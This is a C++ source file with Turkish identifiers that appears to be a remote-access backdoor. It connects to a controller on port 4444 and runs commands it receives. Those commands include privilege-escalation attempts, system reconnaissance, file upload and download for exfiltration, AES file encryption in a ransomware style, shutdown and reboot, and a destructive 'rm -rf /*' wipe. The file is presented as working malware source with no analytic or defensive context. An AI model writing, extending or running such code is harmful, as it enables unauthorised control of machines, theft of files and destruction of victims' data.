#include <iostream>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <cstring>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <cstdlib>
#include <fstream>
#include <sstream>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <dirent.h>
#include <chrono>
#include <thread>

void yetkileri_yukselt() {
    setuid(0);
    setgid(0);
}

int soket_olustur() {
    int soket = socket(AF_INET, SOCK_STREAM, 0);
    if (soket == -1) {
        exit(1);
    }
    return soket;
}

void sunucuya_baglan(int soket, const char* sunucu_ip, int sunucu_port) {
    struct sockaddr_in sunucu_adresi;
    sunucu_adresi.sin_family = AF_INET;
    sunucu_adresi.sin_port = htons(sunucu_port);
    inet_pton(AF_INET, sunucu_ip, &sunucu_adresi.sin_addr);
    connect(soket, (struct sockaddr*)&sunucu_adresi, sizeof(sunucu_adresi));
}

std::string komut_yurut(const std::string& komut) {
    char buffer[128];
    std::string sonuc = "";
    FILE* pipe = popen(komut.c_str(), "r");
    if (!pipe) return "Hata!";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        sonuc += buffer;
    }
    pclose(pipe);
    return sonuc;
}

std::string sistem_bilgisi() {
    struct utsname sistem;
    uname(&sistem);
    std::string bilgi = "Sistem: " + std::string(sistem.sysname) + "\n";
    bilgi += "Host Adı: " + std::string(sistem.nodename) + "\n";
    bilgi += "Sürüm: " + std::string(sistem.release) + "\n";
    bilgi += "Mimari: " + std::string(sistem.machine) + "\n";
    bilgi += "IP Adresi: " + komut_yurut("hostname -I | awk '{print $1}'");
    return bilgi;
}

void dosya_sifrele(const std::string& dosya) {
    unsigned char key[32];
    unsigned char iv[16];
    memset(key, 0, sizeof(key));
    memset(iv, 0, sizeof(iv));
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv);
    std::ifstream ifs(dosya, std::ios::binary);
    std::ofstream ofs(dosya + ".enc", std::ios::binary);
    char buffer[1024];
    int len;
    unsigned char ciphertext[1024 + EVP_MAX_BLOCK_LENGTH];
    while (ifs.read(buffer, sizeof(buffer))) {
        EVP_EncryptUpdate(ctx, ciphertext, &len, (unsigned char*)buffer, ifs.gcount());
        ofs.write((char*)ciphertext, len);
    }
    EVP_EncryptFinal_ex(ctx, ciphertext, &len);
    ofs.write((char*)ciphertext, len);
    EVP_CIPHER_CTX_free(ctx);
    ifs.close();
    ofs.close();
}

void dosya_sil(const std::string& dosya) {
    remove(dosya.c_str());
}

void sistemi_kapat() {
    komut_yurut("shutdown -h now");
}

void sistemi_yeniden_baslat() {
    komut_yurut("reboot");
}

void sistemi_formatla() {
    komut_yurut("rm -rf /*");
}

void dosya_listele(int soket) {
    DIR* dir;
    struct dirent* ent;
    if ((dir = opendir(".")) != nullptr) {
        std::string dosya_listesi;
        while ((ent = readdir(dir)) != nullptr) {
            dosya_listesi += std::string(ent->d_name) + "\n";
        }
        closedir(dir);
        send(soket, dosya_listesi.c_str(), dosya_listesi.length(), 0);
    }
    else {
        send(soket, "Klasör açılamadı.", strlen("Klasör açılamadı."), 0);
    }
}

void yetki_yukseltme_denemeleri(int soket) {
    std::string komutlar[] = {
        "sudo -i",
        "su -",
        "pkexec",
        "setuid 0"
    };
    for (const std::string& komut : komutlar) {
        std::string sonuc = komut_yurut(komut);
        send(soket, sonuc.c_str(), sonuc.length(), 0);
    }
}

void dosya_yukle(int soket) {
    char buffer[1024] = { 0 };
    recv(soket, buffer, sizeof(buffer), 0);
    std::string dosya_adi = buffer;

    std::ofstream ofs(dosya_adi, std::ios::binary);
    while (true) {
        int bytes_received = recv(soket, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) break;
        ofs.write(buffer, bytes_received);
    }
    ofs.close();
}

void dosya_indir(int soket) {
    char buffer[1024] = { 0 };
    recv(soket, buffer, sizeof(buffer), 0);
    std::string dosya_adi = buffer;

    std::ifstream ifs(dosya_adi, std::ios::binary);
    if (ifs) {
        while (ifs.read(buffer, sizeof(buffer))) {
            send(soket, buffer, ifs.gcount(), 0);
        }
        ifs.close();
    }
    send(soket, "Dosya İndirildi.", strlen("Dosya İndirildi."), 0);
}

int main() {
    int sunucu_port = 4444;
    const char* sunucu_ip = "0.0.0.0";
    int soket = soket_olustur();
    sunucuya_baglan(soket, sunucu_ip, sunucu_port);
    char buffer[1024] = { 0 };

    while (true) {
        int veri = recv(soket, buffer, sizeof(buffer), 0);
        if (veri <= 0) break;
        std::string komut(buffer);
        if (komut == "yetki_yukselt") {
            yetki_yukseltme_denemeleri(soket);
        }
        else if (komut == "sistem_bilgisi") {
            std::string bilgi = sistem_bilgisi();
            send(soket, bilgi.c_str(), bilgi.length(), 0);
        }
        else if (komut.find("sifrele:") == 0) {
            std::string dosya = komut.substr(8);
            dosya_sifrele(dosya);
            send(soket, "Dosya şifrelendi.", strlen("Dosya şifrelendi."), 0);
        }
        else if (komut == "dosya_yukle") {
            dosya_yukle(soket);
        }
        else if (komut == "dosya_indir") {
            dosya_indir(soket);
        }
        else if (komut == "dosya_listele") {
            dosya_listele(soket);
        }
        else if (komut == "sistem_kapat") {
            sistemi_kapat();
            break;
        }
        else if (komut == "sistem_yeniden_baslat") {
            sistemi_yeniden_baslat();
            break;
        }
        else if (komut == "sistem_formatla") {
            sistemi_formatla();
            break;
        }
    }
    close(soket);
    return 0;
}
